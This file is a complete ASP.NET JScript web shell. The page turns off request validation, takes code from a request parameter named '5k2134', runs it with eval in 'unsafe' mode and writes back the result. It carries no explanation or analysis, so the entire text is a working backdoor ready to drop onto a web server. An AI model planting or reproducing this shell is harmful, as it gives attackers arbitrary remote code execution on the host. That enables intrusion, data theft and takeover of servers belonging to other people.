<%@ Page Language="Jscript" validateRequest="false" %>
<%
var keng 
keng = Request.Item["5k2134"];
Response.Write(eval(keng,"unsafe"));
%>